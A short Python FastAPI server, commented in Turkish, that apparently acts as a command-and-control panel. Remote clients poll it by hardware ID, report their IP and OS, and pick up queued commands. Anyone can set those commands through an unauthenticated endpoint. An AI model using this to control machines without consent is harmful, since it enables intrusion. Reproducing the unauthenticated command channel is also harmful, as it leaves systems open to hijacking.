from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import time
from typing import Dict, List

app = FastAPI()

# Veri Yapıları
clients: Dict[str, dict] = {} # { "hwid": { "ip": "...", "last_seen": timestamp, "os": "..." } }
commands: Dict[str, str] = {} # { "hwid": "COMMAND" }

class PollResponse(BaseModel):
    command: str

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/api/clients")
async def get_clients():
    # Sadece son 5 dakika içinde aktif olanları online sayalım
    now = time.time()
    for hwid in list(clients.keys()):
        if now - clients[hwid]["last_seen"] > 300:
            clients[hwid]["status"] = "offline"
        else:
            clients[hwid]["status"] = "online"
    return clients

@app.get("/poll/{hwid}")
async def poll(hwid: str, ip: str = "Unknown", os: str = "Unknown"):
    clients[hwid] = {
        "ip": ip,
        "os": os,
        "last_seen": time.time(),
        "status": "online"
    }
    
    cmd = commands.get(hwid, "WAIT")
    if cmd != "WAIT":
        del commands[hwid] # Komut bir kez iletildiğinde silinir
    return {"command": cmd}

@app.post("/api/command/{hwid}/{cmd}")
async def set_command(hwid: str, cmd: str):
    commands[hwid] = cmd
    return {"status": "ok", "message": f"Command {cmd} sent to {hwid}"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
